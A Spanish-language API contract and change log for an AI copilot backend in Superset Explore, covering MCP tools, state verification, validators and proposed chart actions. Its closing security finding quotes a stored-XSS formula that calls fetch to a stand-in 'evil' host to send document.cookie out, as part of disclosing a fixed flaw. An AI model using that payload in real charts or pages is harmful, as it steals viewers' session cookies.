# Contrato v1 del backend del copiloto Explore

Estado: implementado en el backend de chat. Requiere que la extensión publique las
tools MCP indicadas abajo y conecte su REST de Explore al endpoint. No habilitar
el panel para SQL, resultados o cambios hasta cerrar los criterios de la Fase 0
de `PLAN_COPILOTO_EXPLORE.md`.

## Transporte

`POST /api/explore-assistant` en el backend de chat. El proxy de Superset debe
añadir `X-Service-Secret`, `X-Superset-User` y, solo después de comprobar el rol
en su sesión, `X-Superset-Is-Admin: true|false`. Debe eliminar cualquier valor
de este último header recibido del navegador. La ruta también se monta bajo
`/api/chat-widget/api/explore-assistant` por compatibilidad con el proxy actual.

El body debe incluir `mcp_url`, fijada por Superset desde `MCP_WIDGET_URL` y
validada contra `MCP_URL`/`MCP_ALLOWED_URLS`; no se usa la URL implícita cuando
se omite o llega en blanco. La URL no es una credencial. El salto backend → MCP
usa un JWT del usuario autenticado.

Ejemplo mínimo:

```json
{
  "contract_version": 1,
  "source": "superset_explore",
  "mode": "improve_chart",
  "user_message": "Agrega una métrica",
  "conversation_key": "f82d64be-0e0e-4bb6-bcf9-4a99d4917e19",
  "mcp_url": "https://superset.example/mcp",
  "user": {"is_admin": false},
  "chart": {
    "slice_id": 12,
    "form_data_key": "key-1",
    "viz_type": "table",
    "datasource": {"id": 11, "type": "table"},
    "query_context": "{\"datasource\":{\"id\":11,\"type\":\"table\"},\"queries\":[...]}"
  },
  "form_data": {},
  "dataset": {}
}
```

`chart.query_context` (opcional, string JSON, entrada 72 de `Registro de cambios.md`,
2026-09-24): el `query_context` EXACTO que el navegador capturó al observar la
última ejecución real del gráfico (`POST /api/v1/chart/data` — mismo `buildQuery`
del plugin, nativo o uno de los tres propios; nunca reconstruido). Presente solo
cuando hay una captura para el gráfico abierto, o el `query_context` guardado del
gráfico si no hubo ejecuciones posteriores (mismo criterio de fidelidad que ya
regía `preview`). **Es una pista, igual que el resto del body** — el modelo debe
pasarlo TAL CUAL (sin editarlo) como argumento `query_context` a
`irex.explain_chart`/`irex.preview_chart`; esas tools lo re-ejecutan bajo RLS
como verificación independiente, así que no hace falta demostrar acá que es
genuino. Ausente → esas dos tools no tienen nada que ejecutar todavía (gráfico
recién abierto, o `resolveQueryFidelity` del lado del navegador dio
`no-disponible`) y no deberían llamarse.

**Estado (entrada 79, 2026-09-25): el campo ya viaja, resuelto de los dos
lados.** La primera prueba real (entrada 73) tumbó "Explicar" con 422
`extra_forbidden` — el modelo Pydantic que valida `chart` en el backend
del chat no lo reconocía. El backend del chat agregó `query_context` como
string opcional a ese modelo (línea 225 de `api/schemas.py` de ese
repo) — ya no da 422. Del lado de la extensión, `SEND_QUERY_CONTEXT_IN_REQUEST`
en `frontend/src/adapters/exploreAdapter.ts` volvió a `true`: el campo
viaja de nuevo cuando la fidelidad es `'fiel'`.

**El backend del chat, por decisión propia, TODAVÍA no pasa el valor al
modelo ni lo usa para llamar a `irex.explain_chart`/`irex.preview_chart`**
— quiere verificar primero que la captura corresponde al usuario y al
estado actual antes de confiar en ella. Nota de la extensión sobre esto:
`explain_chart`/`preview_chart` ya hacen esa verificación por su cuenta —
comprueban que el `query_context` referencia el mismo dataset/gráfico que
`irex.get_explore_state` (RBAC real, no solo forma) y lo RE-EJECUTAN por
el pipeline real de Superset con RLS aplicado (`QueryContextFactory`/
`ChartDataCommand`) — un `query_context` para un dataset sin acceso, o con
un filtro/columna inválida, falla ahí, no hace falta demostrar antes que
la captura es "genuina". Queda a criterio del backend si esa verificación
alcanza para empezar a usarlas, o si prefiere su propia capa adicional
antes.

`mode`: `explain`, `improve_chart` o `metrics`. `slice_id` puede ser `null`
para un gráfico sin guardar, pero entonces `form_data_key` es obligatoria.
`conversation_key` es UUID estable durante la conversación. El backend deriva
`session_id` del usuario autenticado y la key, y persiste el historial y los
resultados de tools. Cambios de gráfico, dataset, tipo o key agregan una frontera
de contexto: la evidencia anterior deja de ser actual.

`form_data`, `dataset`, `chart` y `user.is_admin` provenientes del navegador son
pistas, no evidencia ni autorización. Antes de consultar el modelo, el backend
lee `irex.get_explore_state` por MCP con la identidad del usuario y exige que
su respuesta coincida con `form_data_key`, `slice_id` y datasource solicitados.
Una acción de dataset requiere además `user.is_admin: true` en esa respuesta
MCP autenticada; el body y el header del proxy por sí solos no bastan.
La respuesta de esa tool debe tener:

```json
{
  "form_data_key": "key-1",
  "slice_id": 12,
  "datasource": {"id": 11, "type": "table"},
  "form_data": {},
  "state_kind": "last_persisted",
  "user": {"is_admin": false}
}
```

Para gráficos sin guardar, `slice_id` debe ser `null`. La tool puede anidar
este objeto bajo `result` o `data`. Debe aplicar RBAC y acceso al dataset. Un
error de permiso explícito produce 403; una respuesta incompleta o de otro
gráfico/dataset produce 502; una tool ausente produce 503. El modelo no recibe
las copias de `form_data` o `dataset` enviadas por el navegador.

## Semántica del estado verificado (2026-09-24)

El backend del chat ya acepta `state_kind: "last_persisted"` para leer y
explicar la configuración persistida. `form_data_key` no prueba ejecución:
Explore actualiza la key también al cambiar de pestaña y al renderizar.
El backend coteja la key, el `slice_id` superior y el datasource; ignora el
posible `form_data.slice_id` obsoleto. Si la key cambia, vuelve a verificar
el estado y descarta el contexto técnico anterior.

Hasta verificar por separado el `query_context` de la petición real
`POST /api/v1/chart/data`, el backend no ofrece SQL, resultados ni rendimiento
y bloquea `preview`. La disponibilidad visual de SQL capturado en el navegador
no es prueba MCP de ejecución.

**Actualización (entrada 72, 2026-09-24): esa verificación independiente ya
existe** — `chart.query_context` (ver el body de arriba) más
`irex.explain_chart`/`irex.preview_chart` (ver "Tools MCP requeridas"). El
modelo puede ofrecer SQL y resultados reales cuando `chart.query_context`
viene presente, pasándolo tal cual a esas tools — que lo re-ejecutan bajo RLS,
la prueba independiente que faltaba.

**Estado (entrada 79, 2026-09-25):** `chart.query_context` ya viaja (ver
el bloque de arriba, junto a la definición del campo) — el 422 que lo
bloqueaba está resuelto de los dos lados. Sigue aplicando el límite de
siempre mientras el backend no pase el valor al modelo ni llame a
`explain_chart`/`preview_chart`: sin eso, sin SQL, resultados ni
`preview` — es una decisión pendiente del backend, no una limitación
técnica del campo en sí.

## Respuesta

La respuesta JSON y el payload del evento SSE `done.explore_response` usan:

```json
{
  "contract_version": 1,
  "source": "superset_explore",
  "session_id": "explore-...",
  "message": "Explicación para la persona",
  "actions": [],
  "diagnostics": [],
  "skip_suggestions": true,
  "suggestions": []
}
```

`diagnostics[]` admite `severity` (`error`, `warning`, `info`), `message` y
`control` opcional. Se reutilizan `suggestion_kind`, `clarification_reason` y
`clarification_questions` del sobre de SQL Lab. Una aclaración no puede tener
acciones. Un resultado que no sea un objeto JSON completo y válido se convierte
en explicación sin acciones.

Acciones v1:

| `type` | Campos obligatorios además de `type` | Validación del backend |
|---|---|---|
| `patch_form_data` | `base_form_data_key`, `operations[]` (`op`, `control`, `value` para set/add) | Key actual; controles del catálogo; sin expresiones ad-hoc embebidas |
| `add_adhoc_metric`, `add_adhoc_column` | `base_form_data_key`, `control`, `label`, `expression` | Key, control y expresión exacta verificados |
| `change_viz_type` | `base_form_data_key`, `viz_type` | Catálogo del tipo destino disponible; operaciones válidas ahí |
| `add_dataset_metric`, `add_calculated_column` | `dataset_id`, `label`, `expression` | Admin del proxy, dataset actual y expresión exacta verificados |
| `preview` | ninguno | No escribe ni aplica cambios |

`expression_type` (`SQL` o `SIMPLE`) y `title` son opcionales. Una acción que no
pasa estas condiciones se elimina de `actions`. El navegador también debe
validar el catálogo y la key actual inmediatamente antes de aplicar, mostrar
el diff y pedir confirmación. Para un dataset, el endpoint de escritura de la
extensión vuelve a comprobar rol Admin, CSRF, dataset y expresión; este
endpoint del chat nunca escribe.

## Comandos del composer: `/resume` y `/clear` (2026-09-28)

Pedido del usuario: al reabrir un gráfico GUARDADO (ej. tras navegar a un dashboard y
volver), el panel arranca siempre en una conversación NUEVA — nunca retoma sola.
`/resume` (comando de barra en el composer, con autocompletado al tipear `/`) permite
recuperar una conversación anterior de ESE gráfico; `/clear` equivale al botón
"Nueva sesión" ya existente.

**Mecanismo, confirmado con el backend del chat:** el backend deriva `session_id` de
`(usuario autenticado, conversation_key)` y persiste el historial (`llm_messages`)
en Postgres, sin TTL en ese almacén — el TTL de 30 min es solo el de la caché en
memoria; si expiró, el backend rehidrata desde Postgres de forma transparente. Por
eso, para retomar, el frontend de la extensión reenvía el MISMO `conversation_key`
UUID que se usó originalmente (nunca el `session_id`, que el backend deriva, no
acepta como input) — el backend reconoce la conversación y el modelo recupera el
contexto guardado.

**Matiz importante, también confirmado por el backend:** el `conversation_key`
reenviado retoma el HISTORIAL de texto, pero cada turno vuelve a verificar
`form_data_key`/`slice_id`/dataset contra `irex.get_explore_state` de la MISMA forma
que un turno nuevo (ver "Semántica del estado verificado" abajo) — si el
`form_data_key` actual difiere del que había cuando se generó la conversación, esa
verificación simplemente usa el estado ACTUAL (correcto y esperado, nunca se confía
en evidencia vieja). Un cambio de gráfico/dataset/tipo/endpoint MCP abre además una
"frontera de contexto" del lado del backend — dejan de pasarse al modelo los
resultados de tools de ANTES de esa frontera, aunque el texto de la conversación siga
visible. En conversaciones muy largas puede haber compactación de contexto del lado
del modelo — no hay garantía de que cada mensaje viejo llegue literalmente en cada
llamada.

**Dónde vive el texto visible de la conversación:** el log de diagnóstico
(`/api/logs/sessions/<id>`, el mismo que se usa para depurar reportes del backend)
NO incluye el texto del usuario, solo llamadas a tools y la respuesta final del
asistente — no sirve para reconstruir una conversación mostrable. Por eso la
extensión NO depende de ese log para `/resume`: guarda su PROPIO historial completo
(usuario + asistente, tal como se ve en pantalla) en `localStorage` del navegador,
indexado por `slice_id` — hasta 10 conversaciones por gráfico, sin vencimiento por
tiempo (pedido explícito del usuario). Consecuencia real: `/resume` solo puede
ofrecer conversaciones que pasaron por ESE navegador — no sincroniza entre
dispositivos ni recupera conversaciones de antes de que existiera esta función.
Implementación: `hosts/exploreConversationHistory.ts` (persistencia),
`assistant/slashCommands.ts` (parser + registro de comandos, extensible),
`ExploreConversation.tsx` (autocompletado en el composer) y
`ExploreAssistantPanel.tsx` (`handleCommand`, picker cuando hay 2+ candidatas).

## Tools MCP requeridas

El modelo solo ve las tools Explore. Las tools de SQL libre de SQL Lab y las
analíticas de dashboards quedan fuera incluso si el MCP las anuncia mediante
`call_tool`.

- `irex.get_explore_state`: obligatoria; devuelve el estado verificado descrito arriba.
- `irex.get_dataset_catalog` (implementada, entrada 87 de
  `Registro de cambios.md`, 2026-09-25 — a pedido del agente del backend
  del chat: sin esto el modelo solo podía comprobar una expresión A LA VEZ
  con `validate_expression`, y terminaba preguntándole al usuario por
  columnas que ya existían en el dataset, o adivinando mal un nombre —
  sesiones reales `explore-2287e800...` y la de la entrada 86). Input
  `{"form_data_key": "key-1"}` — la MISMA key que `get_explore_state`, a
  propósito: el catálogo queda atado al datasource del estado YA
  verificado (mismos chequeos de permisos/acceso, reusa
  `verified_explore_state` sin modificarla), nunca a un `dataset_id`
  suelto que alguien podría pasar sin pasar por esa verificación. Llamar
  ANTES de preguntarle al usuario qué columna representa algo, o de
  adivinar un nombre para `validate_expression`. Ejemplo de respuesta
  (dataset 5, el caso real que motivó esto):
  ```json
  {
    "form_data_key": "key-1",
    "slice_id": 38,
    "datasource": {"id": 5, "type": "table"},
    "state_kind": "last_persisted",
    "columns": [
      {"name": "cuota", "type": "DOUBLE", "label": "Cuota"},
      {"name": "fecha_id", "type": "DATE", "is_temporal": true},
      {"name": "planv", "type": "DOUBLE"},
      {"name": "sell_in", "type": "DOUBLE", "label": "Venta sell-in"}
    ],
    "metrics": [
      {"name": "count", "expression": "COUNT(*)"}
    ],
    "truncated": false
  }
  ```
  `columns[].label`/`description` solo aparecen si el dataset los tiene
  cargados — su ausencia no significa que la columna no exista.
  `is_calculated: true` + `expression` marca una columna calculada
  (virtual, no física); `is_temporal: true` marca la columna de fecha del
  dataset. `metrics[]` son SOLO las métricas GUARDADAS del dataset (Fase
  7, no las ad-hoc que arma el propio modelo) — siempre traen
  `expression`, la SQL real, para poder citarla o reutilizarla tal cual.
  **`truncated: true`** significa que la lista de columnas o de métricas
  se recortó (tope generoso, 300 columnas / 200 métricas) — un nombre que
  no aparece en una respuesta truncada NO está confirmado como inexistente,
  a diferencia de una respuesta con `truncated: false`. Nunca devuelve
  filas ni prueba ejecución — mismo `state_kind: "last_persisted"` que
  `get_explore_state`: que una columna exista en el dataset no confirma
  que el gráfico se haya ejecutado con ella.
- `list_charts` / `get_chart_info` (tools NATIVOS del host, no `irex.*` — ver
  "Excepción" abajo, 2026-09-28): flujo "reutilizar el diseño de un gráfico ya
  guardado en este gráfico": `list_charts` para encontrarlo (paginado, 1-based;
  `search` busca por `slice_name`/`description`, confirmado que encuentra un
  chart fuera de la primera página sin recorrerla entera), `get_chart_info`
  para leer su `form_data` completo dado su `id`. Verificado con pruebas MCP
  reales (JWT propio, sin mocks), no solo lectura de código:
  - **Identidad e RBAC reales**: ambos usan el usuario autenticado del JWT
    (`sub`), no un usuario fijo. `list_charts` solo devuelve gráficos
    visibles para ESE usuario (probado con un usuario sin gráficos propios:
    `total_count: 0`); `get_chart_info` sobre un gráfico SIN permiso devuelve
    `{"error": "ChartInfo with identifier '<id>' not found",
    "error_type": "not_found"}` — nunca los datos, y el mensaje NO distingue
    "no existe" de "no tenés acceso" (mismo comportamiento, no un hueco).
  - **El ID autoritativo es `id` (nivel superior de la respuesta), NUNCA
    `form_data.slice_id`**: `form_data` (el `params` completo del gráfico)
    trae su PROPIO campo `slice_id` interno, que en la práctica coincide con
    `id` pero es un campo DISTINTO — puede quedar desactualizado en un
    gráfico duplicado/importado. Para encadenar `get_chart_info` de un
    resultado de `list_charts`, o para volver a pedir el mismo gráfico, usar
    siempre `id`.
  - **Ejemplo real saneado** (`get_chart_info(identifier=683)`, un gráfico
    html_cards real con `styleTemplate` largo):
    ```json
    {
      "id": 683,
      "slice_name": "Tabla pedidos RTL",
      "viz_type": "html_cards",
      "datasource_name": "default.<dataset>",
      "datasource_type": "table",
      "form_data_key": null,
      "is_unsaved_state": false,
      "form_data": {
        "viz_type": "html_cards",
        "datasource": "<id>__table",
        "handlebarsTemplate": "<section>... (12497 caracteres reales) ...</section>",
        "styleTemplate": ".kpi-mini-grid {...} (19727 caracteres reales) ...",
        "column_config": {"...": "..."},
        "...": "resto de los controles del viz_type, completos"
      }
    }
    ```
    No hay `datasource_id` numérico a nivel superior — solo `datasource_name`
    (string) y `datasource_type`; el ID numérico del datasource está dentro
    de `form_data.datasource` como `"<id>__table"` (mismo formato que
    `chart.datasource` del resto de este contrato), hay que parsearlo si se
    necesita el número.
  - **Sin truncar campos, confirmado con un gráfico de ~40 000 caracteres de
    form_data** (coincide byte a byte con lo guardado). Con un form_data de
    prueba de ~65 000 caracteres (por encima del límite de 60 000 que maneja
    este backend), `get_chart_info` devuelve el form_data COMPLETO o falla
    con un error de tamaño explícito — nunca una copia parcial silenciosa
    (se excluyó del guard de truncado dinámico de Superset, que por defecto
    cortaría campos de más de 500 caracteres — habría destrozado
    `styleTemplate`/`handlebarsTemplate` reales, que rutinariamente pasan
    los 500 caracteres).
  - **Excepción a "el modelo solo ve las tools Explore" (párrafo de arriba)**:
    estos dos son tools NATIVOS de Superset, no de esta extensión — normalmente
    `MCP_FACTORY_CONFIG(include_tags=["irex"])` los oculta de `tools/list` por
    completo (decisión deliberada para no confundir al modelo con tools nativas).
    Ganaron el tag `"irex"` específicamente para este flujo (ver `PLUGINS.md`,
    parche manual sobre `superset/mcp_service/chart/tool/{list_charts,
    get_chart_info}.py`, NO cubierto por `migrate-plugins.sh`) — si el backend
    tiene su PROPIA lista de tools permitidos para el modo Explore (separada de
    lo que anuncia el MCP), hay que sumarlos ahí también.
- `irex.get_viz_controls` (implementada, entrada 78 de `Registro de cambios.md`,
  2026-09-24; `control_info` agregado en la entrada 93, 2026-09-25): input
  `{"viz_type": "table_v3"}`. Obligatoria para aceptar cambios de controles
  (`patch_form_data`) o de tipo (`change_viz_type`) — sin validar el
  nombre del control contra esto, no confiar en la propuesta. Devuelve:
  ```json
  {
    "viz_type": "table_v3",
    "controls": ["adhoc_filters", "calculated_columns", "column_config", "..."],
    "source": "specific",
    "control_info": {
      "calculated_columns": {
        "description": "Columnas nuevas calculadas EN EL NAVEGADOR con placeholders {{Columna}} — NO es SQL. ... validar SIEMPRE con irex.validate_calculated_column_formula antes de proponer."
      },
      "column_config": {
        "description": "Personalización por columna/métrica, indexada por su LABEL (no por column_name interno): nombre a mostrar (displayName), formato numérico D3 (d3NumberFormat), y — solo si allow_render_html está activo — una plantilla HTML propia (htmlTemplate, enableHtmlTemplate:true) ..."
      },
      "adhoc_filters": { "description": "Filtros del gráfico." }
    }
  }
  ```
  `control_info` es aditivo: `{nombre_de_control: {"description": "..."}}`
  para cada nombre en `controls` que tiene descripción conocida — la
  respuesta de arriba (`controls`, `source`, `note`) no cambió de forma,
  solo se sumó este campo. Cubre el 100% de los controles de los tres
  plugins propios (`source: "specific"`) y del catálogo compartido
  (`source: "generic"`), extraído leyendo el código fuente real (los
  `controlPanel.tsx` de cada plugin propio; `sharedControls.tsx`/
  `dndControls.tsx` de `@superset-ui/chart-controls` para lo genérico — ahí
  Superset ya documenta `label`/`description` por control para sus propios
  tooltips de UI). Antes de esto, `get_viz_controls` solo daba NOMBRES: el
  modelo sabía que `column_config`/`jinja_fields`/`calculated_columns`
  EXISTÍAN como controles de `table_v3`, pero no tenía ninguna guía sobre
  CÓMO se arma cada uno (que `column_config` se indexa por label y no por
  nombre de columna, que `calculated_columns` es un lenguaje propio y no
  SQL, etc.) — pedido explícito del usuario: "necesito que el LLM pueda
  ver e interactuar" con las personalizaciones de los plugins propios. Un
  nombre en `controls` sin entrada en `control_info` simplemente no tiene
  descripción documentada todavía (no debería pasar en los tres plugins
  propios ni en el catálogo genérico — hay un test que lo verifica
  explícitamente — pero si un control nuevo se agrega sin su descripción,
  esto degrada con gracia en vez de romper).

  **Ampliación 2026-09-28 (entrada 94), a partir de una pregunta puntual
  del usuario ("¿el LLM ya sabe usar cada campo de fórmulas Jinja con sus
  personalizaciones row.{{}}/col.{{}}/total.{{}}? ¿y los campos HTML, dónde
  usa solo HTML y dónde también CSS? ¿y html_cards, que tiene instrucciones
  muy específicas?") — revisión más profunda encontró que la primera
  versión de `control_info` tenía huecos reales, no solo faltaba
  profundidad:
  - `calculated_columns` (`table_v3`) no explicaba que `{{Columna}}` /
    `row.{{Columna}}` / `col.{{Columna}}` son EQUIVALENTES (las tres leen
    la fila actual — `row.`/`col.` son alias de compatibilidad, no
    cambian nada) y que SOLO `total.{{Columna}}` difiere (lee la fila de
    total de la tabla) — confirmado leyendo `SCOPE_GETTERS` en
    `calculatedColumns.ts`.
  - `column_config.htmlTemplate` de `table_v3`/`pivot_table_rx1` estaba
    descrito con la sintaxis EQUIVOCADA — no es sustitución tipo
    `calculated_columns`, es Jinja-like con `{% set %}` y
    `CASE WHEN...THEN...ELSE...END`, deliberadamente restringido (sin
    SUM/AVG/COUNT, sin OR/AND/IS NULL/IN, sin comentarios ni macros).
    Encontrado leyendo `HTML_TEMPLATE_AI_PROMPT` en
    `ColumnConfigControl/constants.tsx` — una constante que el propio
    proyecto ya escribió explícitamente para pegarse en un prompt de IA
    (tiene botón "copiar" en la UI real) — se transcribió literal a
    `COLUMN_CONFIG_HTML_TEMPLATE_RULES`, sin reinterpretar.
  - La descripción de `column_config` de `pivot_table_rx1` decía
    "formato numérico D3" — **incorrecto**: su layout real
    (`HTML_COLUMN_CONFIG_LAYOUT`) solo trae `displayName` + HTML, sin
    `htmlCss` ni formato numérico — a diferencia de `table_v3`, que sí
    tiene los tres. Corregido, con la diferencia explícita.
  - `handlebarsTemplate` de `html_cards` solo mencionaba 5 helpers de
    formato; la lista real (tooltip de ayuda del propio control) tiene
    18, incluidos varios no obvios de manejo de arrays/estructura
    (`pluck`, `sum`, `coalesce`, `hasValue`, `parseJson`, `rows`,
    `displayRows`, `firstDisplayRow`, `columns`, `rowCount`,
    `width`/`height`, `layout.isCompact`/`isNarrow`/`isTiny`,
    `scopeId`/`scopeSelector`, `themeVars`) — ahora está la lista
    completa.
  - `styleTemplate` de `html_cards` suma el aviso real de la propia UI:
    "Se necesita configurar la sanitización de HTML para poder usar
    CSS" — si el CSS propuesto no se ve, puede ser por eso, no por un
    error del CSS en sí.

  Regla general que queda de esto para el resto del catálogo: cuando el
  plugin real deja escrita una explicación para humanos (tooltips,
  constantes de ejemplos, un prompt para IA ya armado), se transcribe
  literal en vez de resumir con criterio propio — resumir de más fue
  justamente lo que produjo el error de `column_config`.

  **Ampliación 2026-09-28 (entrada 95), a partir de una recomendación del
  agente del backend del chat sobre una sesión real** (una plantilla de
  rangos sin guard de nulo mandaba un valor vacío a `ELSE`, mostrándolo
  como si fuera el extremo del rango en vez de "sin dato") — verificada
  leyendo `formatValue.ts` (`getTemplateValue`/`evaluateWhenCondition`)
  antes de aplicarla, no solo tomada de su palabra: `{{ value }}`,
  `{{ raw_value }}`, y repetir el nombre/label de la MISMA columna que
  tiene el `htmlTemplate` son la MISMA ruta de código — un valor nulo ahí
  se convierte en `''` (comparable con `= ''`). Referenciar OTRA columna
  es una ruta distinta — un valor nulo ahí deja la comparación en
  `undefined`, y esa rama del `CASE WHEN` se salta en silencio (nunca
  compara contra `''`). Consecuencia práctica para `column_config` de
  `table_v3`/`pivot_table_rx1`: si el valor de la propia columna puede
  ser nulo, el PRIMER `WHEN` de la cadena tiene que ser
  `{{ raw_value }} = ''` (o el nombre de esa misma columna repetido) —
  si no, un nulo cae al `ELSE` sin que nadie lo note.

  **Ampliación 2026-09-28 (`group`/`division` de `handlebarsTemplate`,
  `html_cards`), reportada por el backend del chat sobre una sesión real**
  (sesión `explore-fa693d0e...`): el asistente rechazó proponer una tarjeta
  por familia con tabla de marcas anidada porque `control_info` no
  documentaba cómo agrupar filas dentro de la plantilla, aunque el plugin
  ya registra `HandlebarsGroupBy.register(Handlebars)` (helper `group`,
  sintaxis `{{#group displayRows by="<templateKey>"}}{{value}}{{#each
  items}}...{{/each}}{{/group}}`) y `division` (vía
  `Helpers.registerHelpers(Handlebars)`, de `just-handlebars-helpers`).
  Verificado leyendo `HandlebarsViewer.tsx` (registro real) y el
  `README.md` del paquete `handlebars-group-by`, no solo tomado del
  reporte. Dos hallazgos propios al escribir la prueba de render:
  `division(a, b)` NO protege contra `b` nulo/0 (`Infinity`/`NaN`) — hay
  que envolver en `{{#if b}}...{{else}}...{{/if}}` (`{{#if 0}}` es falso
  en Handlebars); y combinar `group` con `{{#with (sum (pluck items
  "X")) as |d|}}` para no repetir la expresión rompe en silencio, porque
  `{{value}}`/`items` dejan de apuntar al `{{#group}}` exterior salvo que
  se use `../value`/`../items` — más simple repetir `(sum (pluck items
  "X"))` que anidar `#with`. `control_info.handlebarsTemplate` y el
  tooltip de ayuda del control (`handlebarTemplate.tsx`) se actualizaron
  juntos para que digan lo mismo (antes solo el tooltip real tenía la
  lista completa; ahora ninguno de los dos se queda corto). Nota de
  infraestructura encontrada de paso, no resuelta: Jest, con la config
  actual de `superset-frontend/jest.config.js`, NO descubre tests dentro
  de `custom-plugins/*` (son symlinks — el crawler de `jest-haste-map` no
  los sigue, y aunque se fuerce el descubrimiento con `--roots`, la
  resolución de módulos hoisted como `handlebars` tampoco alcanza el
  `node_modules` real de `superset-frontend` desde esa ruta) — la prueba
  de render con datos sintéticos (`plugin-chart-html-cards/src/__tests__/
  handlebarsGroupHelpers.test.ts`) queda en el lugar canónico correcto
  según `PLUGINS.md`, pero no corre todavía vía `npm run test`; se validó
  aparte con un script Node standalone contra los mismos paquetes reales.
  Esto afecta a los TRES plugins propios por igual (ninguno tenía tests
  antes de este cambio) — arreglar `jest.config.js` es un cambio a un
  archivo compartido de Superset, fuera del alcance de este pedido puntual
  sin autorización explícita.

  `source` tiene TRES niveles, nunca mezclados — clave para decidir cuánto
  confiar en la lista:
  - `"specific"`: solo para los tres plugins propios (`table_v3`,
    `html_cards`, `pivot_table_rx1`) — lista EXACTA y COMPLETA, verificada
    leyendo su código fuente real. Un control que no está en esta lista NO
    existe para ese tipo — se puede rechazar la propuesta con confianza.
  - `"generic"`: para cualquier otro `viz_type` REAL (uno de los ~50 tipos
    nativos de esta instalación de Superset) — el catálogo compartido que
    la mayoría de los tipos reusa (`metrics`, `groupby`, `adhoc_filters`,
    `row_limit`, `time_range`, `x_axis`, etc.), NO verificado
    específicamente para ese tipo. Trae además un campo `note` explicando
    esto. Un control ausente de esta lista genérica NO prueba que no
    exista (podría ser un control propio de ese tipo nativo que el
    catálogo compartido no cubre) — al revés de `"specific"`, acá conviene
    ser permisivo al rechazar.
  - `"unknown"` (agregado en la entrada 79, 2026-09-25, a partir del
    hallazgo del backend del chat: "para cambiar a otro tipo, generic no
    basta — el MCP también lo devuelve para nombres de tipo inventados"):
    el `viz_type` pedido NO es ninguno de los anteriores — no existe en
    esta instalación de Superset. `controls` viene vacío y `note` lo
    explicita. Un `change_viz_type` a un `viz_type` con `source: "unknown"`
    se puede rechazar directamente, sin necesitar lógica propia para
    detectar el caso.
- `irex.validate_expression` (implementada, entrada 80 de
  `Registro de cambios.md`, 2026-09-25 — encontrada la falta en una sesión
  real: el modelo se negó, correctamente, a proponer `SUM(cuota)` porque
  "no confirma que cuota exista en este dataset", sin tener cómo
  comprobarlo): input `{"dataset_id": 5, "expression": "SUM(cuota)",
  "kind": "metric"}` (`kind`: `"metric"` o `"column"`). Ejecuta la
  expresión DE VERDAD contra la base (`row_limit: 1`, con RLS y acceso al
  dataset vía el mismo pipeline que `explain_chart`/`preview_chart`) —
  `result_type=query` (solo generar SQL) NO alcanzaba: una columna que no
  existe recién falla en el motor de la base, no en la generación del SQL.
  Devuelve `{"valid": true, "dataset_id": 5, "expression": "SUM(cuota)"}`
  si corrió sin error, o `{"valid": false, "dataset_id": ..., "expression":
  ..., "error": "<mensaje real de la base>"}` si no — nunca devuelve filas
  ni valores calculados, es una verificación, no una vista previa. Solo
  esa coincidencia exacta (`valid: true` + la MISMA `expression`, sin
  reformatear) habilita la acción. El backend comprueba cada expresión
  propuesta que el modelo no haya validado ya (máximo cuatro
  verificaciones adicionales por turno).
- `irex.validate_calculated_column_formula` (implementada, entrada 92 de
  `Registro de cambios.md`, 2026-09-25, a pedido del usuario: "en la
  tableV3 puedo usar jinja en varias opciones... necesito que el LLM
  pueda verlos e interactuar"): **NO es SQL** — verifica una fórmula del
  control `calculated_columns` de `table_v3`, un lenguaje de fórmulas
  propio con referencias `{{Columna}}`/`scope.{{Columna}}`/`scope.Columna`
  (`scope` es `total`/`col`/`row`) y funciones `IF`/`OR`/`AND`/`NOT`/
  `ISBLANK`/`ABS`/`ROUND`/`MAX`/`MIN`, que se compila y evalúa en el
  NAVEGADOR (`new Function(...)`, nunca contra la base) — `validate_expression`
  no sirve acá. Input `{"form_data_key": "key-1", "expression": "IF({{Cuota}} = 0, 0, {{Venta}}/{{Cuota}})"}`
  — la MISMA key que el resto de las tools de Explore; los nombres
  disponibles para la fórmula (columnas agrupadas, etiquetas de métricas,
  otras `calculated_columns` ya definidas) salen del estado YA
  verificado, no de lo que el modelo recuerde. Devuelve
  `{"valid": true, "resolved_references": ["Venta", "Cuota"], "warnings": []}`
  o `{"valid": false, "error": "...", "unknown_references": [...],
  "unknown_functions": [...], "warnings": [...]}`. **Importante:** `valid: true` confirma que
  las referencias existen y la estructura (llaves/paréntesis balanceados,
  sin funciones desconocidas) es sana — NO ejecuta la fórmula ni confirma
  qué valor calcula: eso solo se ve en el navegador con datos reales. Vale
  la pena llamarla siempre antes de proponer o editar una fórmula: una
  referencia a una columna que no existe, o una función mal escrita, NO
  da error visible en el gráfico — la fórmula queda en blanco en silencio
  en todas las filas, sin ningún aviso, así que sin esta verificación
  previa un error así puede pasar completamente desapercibido. No cubre
  `jinja_fields` (son SQL real, usar `validate_expression`) ni
  `metricFormulas` de `pivot_table_rx1` (mecanismo propio de ese plugin,
  no confirmado que sea el mismo compilador — no extendido todavía).

  `warnings` (agregado en la entrada 95, 2026-09-28, a partir de un caso
  real: una fórmula con `total.{{Sell In}}` dio `valid: true` — la
  estructura y la referencia SÍ eran correctas — pero "no funcionó"
  porque el gráfico no tenía `show_totals` activo): SIEMPRE `[]` salvo un
  caso conocido hoy — la fórmula usa el alcance `total.{{...}}` pero
  `show_totals` no está activo en el `form_data` verificado. Sin
  `show_totals`, `TableChart.tsx` nunca calcula la fila de total
  (`enrichedTotal` queda `null`), así que `total.{{...}}` resuelve
  SIEMPRE a nulo — `ISBLANK(total.{{...}})` da `true` en todas las filas,
  y cualquier fórmula que dependa de eso (típicamente un
  `IF(OR(ISBLANK(total.{{X}}), total.{{X}} = 0), 0, ...)` para evitar
  dividir por cero) devuelve SIEMPRE el mismo resultado (el de la rama de
  error), nunca el cálculo real — un bug real y silencioso, no cosmético.
  Si `warnings` no está vacío y la fórmula usa `total.{{...}}`, agregar
  `{"op": "set", "control": "show_totals", "value": true}` a la MISMA
  propuesta (`patch_form_data`), no una aparte.

  **Hallazgo de seguridad 2026-09-29 (corregido)**: el compilador real
  (`calculatedColumns.ts::buildJsExpression`) solo traduce nombres
  ALL-CAPS conocidos (`IF`, `OR`, ...) y dejaba pasar CUALQUIER otro
  identificador intacto hasta `new Function(...)` — que no aísla del
  scope global del navegador. Una fórmula como
  `(1, fetch('https://evil/steal?c='+document.cookie))` no tiene ninguna
  palabra en mayúsculas, compilaba y EJECUTABA de verdad con acceso real
  a `document`/`window`/`fetch` (Stored XSS: cualquier usuario con permiso
  de editar el gráfico podía inyectarla, y corría en el navegador de
  cualquiera que viera ese gráfico, incluido en dashboards compartidos).
